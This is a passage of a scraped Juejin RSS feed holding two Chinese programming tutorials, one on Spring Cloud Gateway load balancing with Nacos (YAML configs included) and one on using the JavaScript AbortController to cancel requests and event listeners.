</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[004-spring cloud alibaba之gateway网关-负载均衡]]></title>    <link>https://juejin.cn/post/7592075359379816500</link>    <guid>https://juejin.cn/post/7592075359379816500</guid>    <pubDate>2026-01-06T07:55:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592075359379816500" data-draft-id="7591942733365559330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="004-spring cloud alibaba之gateway网关-负载均衡"/> <meta itemprop="keywords" content="微服务"/> <meta itemprop="datePublished" content="2026-01-06T07:55:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="超级小猪"/> <meta itemprop="url" content="https://juejin.cn/user/3702810891008525"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            004-spring cloud alibaba之gateway网关-负载均衡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810891008525/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    超级小猪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:55:42.000Z" title="Tue Jan 06 2026 07:55:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">gateway负载均衡</h2>
<blockquote>
<p>主要内容：使用自动负载均衡能力/手动负载均衡。启动多个user服务。让gateway自动选择需要路由到哪个user服务中。这其中有两点需要关心</p>
<ul>
<li>自动负载能力：一般采用轮询的方式调用user服务</li>
<li>gateway查找规则：user服务注册到nacos上gateway会按照注册的服务名称自动映射到对应的服务<br/>
手动负载均衡同样可以实现上面的能力还可以避免暴露nacos服务注册的服务名</li>
</ul>
</blockquote>
<ul>
<li>自动负载均衡</li>
<li>手动负载均衡</li>
</ul>
<h3 data-id="heading-1">1、gateway自动负载均衡</h3>
<h4 data-id="heading-2">1.1 启动服务情况</h4>
<p>启动两个user服务</p>





















<table><thead><tr><th>服务</th><th>端口</th></tr></thead><tbody><tr><td>user</td><td>9001</td></tr><tr><td>user</td><td>9002</td></tr><tr><td>gateway</td><td>9999</td></tr></tbody></table>
<p>服务都注册到nacos上面</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c18508efa6594cda8b63976bd34bfac3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LaF57qn5bCP54yq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768290941&amp;x-signature=jW4%2B%2Beph%2BdCOrQx0sEJNBVQNMKw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">1.2 gateway配置文件</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway-service</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">10.106</span><span class="hljs-number">.114</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">locator:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<p>其中<code>gateway.discovery.locator.enabled=true</code>就是开启自动负载功能。此时如何访问：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A9999%2Fuser%2Fuser%2Fhello" target="_blank" title="http://localhost:9999/user/user/hello" ref="nofollow noopener noreferrer">http://localhost:9999/user/user/hello</a> 就能够自动访问到user服务。前面一个/user/是在找nacos上面的服务，后面一个/user/是我们前面配置的context-path。所以我们可以去掉context-path然后重启user，这样访问路径就变成：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A9999%2Fuser%2Fhello" target="_blank" title="http://localhost:9999/user/hello" ref="nofollow noopener noreferrer">http://localhost:9999/user/hello</a></p>
<h5 data-id="heading-4">1.2.1 user服务配置文件变更</h5>
<p>变更前</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>
  <span class="hljs-attr">servlet:</span>
    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/user/</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">discovery:</span>
      <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>

<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre>
<p>变更后</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9001</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">user</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">discovery:</span>
      <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>

<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre>
<p>这种自动负载会暴露我们nacos注册的服务名字。还可以使用手动负载</p>
<h3 data-id="heading-5">2、手动负载均衡</h3>
<p>修改gateway配置文件</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">gateway-service</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">10.106</span><span class="hljs-number">.114</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">locator:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">false</span>
      <span class="hljs-attr">routes:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user</span>
          <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://user</span>
          <span class="hljs-attr">predicates:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/cjxz/**</span>
          <span class="hljs-attr">filters:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">StripPrefix=1</span> <span class="hljs-comment"># 去掉第一个路径：/cjxz/</span>
<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-string">include:'*'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AbortController 深度解析：Web 开发中的“紧急停止开关”]]></title>    <link>https://juejin.cn/post/7591778827308924968</link>    <guid>https://juejin.cn/post/7591778827308924968</guid>    <pubDate>2026-01-06T05:57:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591778827308924968" data-draft-id="7591786340322181154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AbortController 深度解析：Web 开发中的“紧急停止开关”"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T05:57:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只爱吃糖的小羊"/> <meta itemprop="url" content="https://juejin.cn/user/1865251025859358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AbortController 深度解析：Web 开发中的“紧急停止开关”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1865251025859358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只爱吃糖的小羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:57:02.000Z" title="Tue Jan 06 2026 05:57:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 Web 开发中，异步操作（如网络请求、定时器、事件监听）无处不在。然而，如何优雅地终止这些不再需要的异步操作，长期以来一直是前端开发中的一个痛点。</p>
<blockquote>
<p><strong>前排广告位：欢迎访问我的个人网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhixiaohezi.com%2F" target="_blank" title="https://hixiaohezi.com/" ref="nofollow noopener noreferrer">hixiaohezi.com</a></strong></p>
</blockquote>
<blockquote>
<p><strong>欢迎关注微信公众号<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlKcA-cA-vTnobIOX-ecfMA" target="_blank" title="https://mp.weixin.qq.com/s/lKcA-cA-vTnobIOX-ecfMA" ref="nofollow noopener noreferrer">“Hi 小禾子”</a></strong></p>
</blockquote>
<p><code>AbortController</code> 作为一个标准的 Web API，为开发者提供了一种统一、且具备高度扩展性的方式来取消异步任务。</p>
<hr/>
<h3 data-id="heading-0">一、 什么是 AbortController？</h3>
<p><code>AbortController</code> 是一个 DOM 标准定义的接口，旨在提供一种通用的“取消信号”机制。它主要由两个部分组成：</p>
<ol>
<li><strong>控制器（Controller）</strong>：通过实例化 <code>new AbortController()</code> 创建，负责发出取消指令。</li>
<li><strong>信号（Signal）</strong>：位于控制器的 <code>signal</code> 属性中，用于传递取消指令。异步 API（如 <code>fetch</code>）通过接收这个信号来决定何时终止操作。</li>
</ol>
<hr/>
<h3 data-id="heading-1">二、 核心基础：如何使用？</h3>
<p>其工作流程可以类比为“电视机”与“遥控器”：<code>Signal</code> 是电视机接收的无线信号，而 <code>Controller</code> 就是手中的遥控器。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 创建控制器</span>
<span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-keyword">const</span> signal = controller.<span class="hljs-property">signal</span>;

<span class="hljs-comment">// 2. 将信号传递给支持该机制的 API（如 fetch）</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>, { signal })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> === <span class="hljs-string">'AbortError'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求已被手动取消'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'其他网络错误'</span>, err);
    }
  });

<span class="hljs-comment">// 3. 在需要的时候发出取消指令</span>
<span class="hljs-comment">// 比如用户离开了当前页面，或者点击了“停止运行”按钮</span>
controller.<span class="hljs-title function_">abort</span>();
</code></pre>
<hr/>
<h3 data-id="heading-2">三、 实战场景解析</h3>
<h4 data-id="heading-3">1. 解决网络请求的“竞态限制” (Race Conditions)</h4>
<p>在搜索框搜索时，频繁的输入会触发多次 API 请求。虽然可以通过**防抖（Debounce）<strong>或</strong>节流（Throttle）**减少请求发起的频率，但它们无法解决网络层面的“竞态”问题：</p>
<ul>
<li><strong>防抖/节流的局限</strong>：它们仅控制触发频率。即使请求频率降低了，仍可能出现先发出的请求（由于后端处理慢或网络波动）比后出的请求更晚返回的情况。如果前端直接采用最后返回的结果，就会导致数据显示错乱。</li>
<li><strong>AbortController 的优势</strong>：它直接在网络层撤销不再需要的请求。通过在发起新请求前调用 <code>controller.abort()</code>，可以确保只有最后一次请求的结果被处理，从根本上杜绝了旧数据覆盖新数据的风险。</li>
</ul>
<p><strong>最佳实践建议</strong>：防抖与 <code>AbortController</code> 并不冲突。通常建议将两者结合使用：用防抖节省服务器带宽，用 <code>AbortController</code> 保证前端数据的终态一致性。</p>
<h4 data-id="heading-4">2. 事件监听器的“一键清理”</h4>
<p>在处理复杂的 UI 组件时，通常需要绑定大量的事件监听。手动逐个调用 <code>removeEventListener</code> 不仅繁琐，且容易造成遗漏。</p>
<p>现代浏览器支持将 <code>signal</code> 传入 <code>addEventListener</code> 的配置项中：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();

<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 处理逻辑 */</span> }, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> });
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 处理逻辑 */</span> }, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> });

<span class="hljs-comment">// 当组件卸载或任务结束时，一行代码即可清除所有关联的监听器</span>
controller.<span class="hljs-title function_">abort</span>();
</code></pre>
<h4 data-id="heading-5">3. 处理超时逻辑</h4>
<p>利用 <code>AbortSignal.timeout()</code>（较新特性），可以更简洁地实现请求超时机制，而不再需要手动组合 <code>setTimeout</code> 与 <code>Promise</code>。</p>
<hr/>
<h3 data-id="heading-6">四、 实际开发中使用的多吗？</h3>
<p><strong>答案是：越来越多，且已成为标准做法。</strong></p>
<ul>
<li><strong>主流库的兼容性</strong>：著名的网络请求库 <strong>Axios</strong> 在 v0.22.0 之后正式废弃了旧有的 <code>CancelToken</code> 方案，转而全面支持 <code>AbortController</code> 规范。这意味着它已成为 JS 生态中取消异常操作的事实标准。</li>
<li><strong>并发库的支持</strong>：如 <code>React Query</code>、<code>SWR</code> 等流行数据请求方案，其底层均高度依赖该 API 来处理自动重试、请求取消及并发控制。</li>
<li><strong>跨环境一致性</strong>：<code>AbortController</code> 不仅在浏览器环境得到原生支持，在 <strong>Node.js</strong>（v15+）中也已内置，为全栈开发带来了统一的体验。</li>
</ul>
<hr/>
<h3 data-id="heading-7">五、 总结</h3>
<p><code>AbortController</code> 并不只是为取消 <code>fetch</code> 请求而设计的。它的核心价值在于提供了一种<strong>跨库、跨环境、跨 API</strong> 的通用终止协议。</p>
<p>对于追求代码健壮性的开发者而言，掌握这一机制能够更精确地控制资源生命周期，从而避免内存泄漏与逻辑碎片。</p>
<blockquote>
<p><strong>欢迎访问我的个人网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhixiaohezi.com%2F" target="_blank" title="https://hixiaohezi.com/" ref="nofollow noopener noreferrer">hixiaohezi.com</a></strong></p>
</blockquote>
<blockquote>
<p><strong>欢迎关注微信公众号<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlKcA-cA-vTnobIOX-ecfMA" target="_blank" title="https://mp.weixin.qq.com/s/lKcA-cA-vTnobIOX-ecfMA" ref="nofollow noopener noreferrer">“Hi 小禾子”</a></strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2588ddc10c8545a68eefb9f75060e730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q54ix5ZCD57OW55qE5bCP576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283822&amp;x-signature=KVmbncQZjSI4kOmdsnAUCGkY834%3D" alt="og-image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>